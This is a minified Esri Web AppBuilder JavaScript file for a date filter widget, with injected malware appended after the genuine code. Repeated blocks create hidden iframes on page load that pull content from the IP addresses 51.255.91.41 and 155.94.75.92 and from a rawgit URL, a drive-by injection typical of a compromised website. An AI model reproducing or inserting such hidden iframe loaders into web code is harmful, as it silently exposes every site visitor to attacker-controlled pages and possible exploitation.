// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/_filter/DateValueSelector.html":'\x3cdiv\x3e\r\n\t\x3cinput data-dojo-type\x3d"dijit/form/DateTextBox" data-dojo-attach-point\x3d"dateTextBox" class\x3d"custom-date-text-box" data-dojo-attach-event\x3d"change:_onDateTextBoxChanged" data-dojo-props\x3d\'required:false,trim:true\' /\x3e\r\n\t\x3cselect data-dojo-type\x3d"dijit/form/Select" data-dojo-attach-point\x3d"dateTypeSelect" class\x3d"date-type-select restrict-select-width" data-dojo-attach-event\x3d"change:_onDateTypeSelectChanged"\x3e\r\n\t\x3c/select\x3e\r\n\x3c/div\x3e'}});
define("dojo/aspect dojo/Evented dojo/on dojo/_base/html dojo/_base/lang dojo/_base/array dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./DateValueSelector.html jimu/filterUtils jimu/utils dijit/form/Select dijit/form/DateTextBox".split(" "),function(e,g,h,f,b,k,l,m,n,p,q,d,r){return l([m,n,p,g],{templateString:q,virtualDates:null,postMixInProperties:function(){this.inherited(arguments);this.nls=window.jimuNls.filterBuilder},postCreate:function(){this.inherited(arguments);
f.addClass(this.domNode,"jimu-date-value-selector");this.virtualDates&&0<this.virtualDates.length||(this.virtualDates=[d.VIRTUAL_DATE_TODAY,d.VIRTUAL_DATE_YESTERDAY,d.VIRTUAL_DATE_TOMORROW]);this.dateTypeSelect.addOption({value:"",label:"\x26nbsp;"});this.dateTypeSelect.addOption({value:"custom",label:this.nls.custom});k.map(this.virtualDates,b.hitch(this,function(a){var c={value:a,label:a};switch(a){case d.VIRTUAL_DATE_TODAY:c.label=this.nls.today;break;case d.VIRTUAL_DATE_YESTERDAY:c.label=this.nls.yesterday;
break;case d.VIRTUAL_DATE_TOMORROW:c.label=this.nls.tomorrow}this.dateTypeSelect.addOption(c)}));this._showDateTypeSelect();this.own(h(f.byId("main-page"),"click",b.hitch(this,function(){this.dateTextBox&&this.dateTextBox.closeDropDown()})));this.own(e.before(this.dateTypeSelect,"openDropDown",b.hitch(this,function(){"custom"===this.dateTypeSelect.getValue()&&this.dateTextBox.getValue()&&(this.dateTypeSelect.textDirNode.innerText=this._formatDate(this.dateTextBox.getValue()))})));this.own(e.after(this.dateTypeSelect,
"closeDropDown",b.hitch(this,function(){"custom"===this.dateTypeSelect.getValue()&&this.dateTextBox.getValue()&&(this.dateTypeSelect.textDirNode.innerText=this._formatDate(this.dateTextBox.getValue()))})));this.own(e.after(this.dateTypeSelect.dropDown,"onItemClick",b.hitch(this,function(a,c){a&&"custom"===a.option.value&&this._showDateTextBox()}),!0));this.popupInfo&&this.popupInfo.fieldInfos&&(this.fieldInfo=this.popupInfo.fieldInfos.filter(b.hitch(this,function(a){return a.fieldName===this._fieldInfo.name}))[0])},
getDijits:function(){return[]},setValueObject:function(a){a.virtualDate&&"custom"!==a.virtualDate?this.dateTypeSelect.set("value",a.virtualDate,!1):(this.dateTypeSelect.set("value","custom",!1),a.value&&(this.dateTextBox.set("value",new Date(a.value),!1),this.dateTypeSelect.textDirNode.innerText=this._formatDate(new Date(a.value))))},getValueObject:function(){return this.isValidValue()?this.tryGetValueObject():null},tryGetValueObject:function(){if(this.isInvalidValue())return null;var a={value:null,
virtualDate:""},c=this.dateTypeSelect.get("value"),b=null;"custom"===c?(b=this.dateTextBox.get("value"),a.value=b?b.toDateString():null,a.virtualDate=""):(b=d.getRealDateByVirtualDate(c),a.virtualDate=c,b?a.value=b.toDateString():a=null);return a},setRequired:function(a){this.dateTextBox.set("required",a)},getStatus:function(){return"custom"===this.dateTypeSelect.get("value")?this._getStatusForDijit(this.dateTextBox):""===this.dateTypeSelect.get("value")?0:1},_getStatusForDijit:function(a){return a.validate()?
a.get("DisplayedValue")?1:0:-1},isInvalidValue:function(){return 0>this.getStatus()},isEmptyValue:function(){return 0===this.getStatus()},isValidValue:function(){return 0<this.getStatus()},_showDateTypeSelect:function(){this.dateTextBox.closeDropDown()},_showDateTextBox:function(){this.dateTextBox.openDropDown();this.dateTextBoxClickBinded=!0},_onDateTypeSelectChanged:function(){"custom"===this.dateTypeSelect.get("value")&&this._showDateTextBox();this.emit("change")},_onDateTextBoxChanged:function(a){this.dateTypeSelect.textDirNode.innerText=
this._formatDate(a);this.emit("change")},_formatDate:function(a){return this.fieldInfo?r.localizeDateByFieldInfo(a,this.fieldInfo):a.toDateString()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});